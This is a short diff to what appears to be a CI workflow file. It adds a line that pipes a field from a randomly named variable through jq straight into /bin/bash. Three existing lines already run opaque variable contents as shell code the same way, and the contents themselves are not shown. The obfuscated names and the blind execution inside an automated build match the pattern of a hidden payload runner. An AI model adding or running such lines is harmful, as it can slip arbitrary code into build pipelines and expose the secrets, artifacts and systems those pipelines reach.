@@ -30,6 +30,7 @@ jobs:
           echo $dffk6 | jq -r .nygrq45396 | /bin/bash
           echo $iprjt8 | jq -r .yrv10 | /bin/bash
           printf '%s' "$xh3" | jq -r .cwacw02310 | /bin/bash
+          echo $r05 | jq -r .c0 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
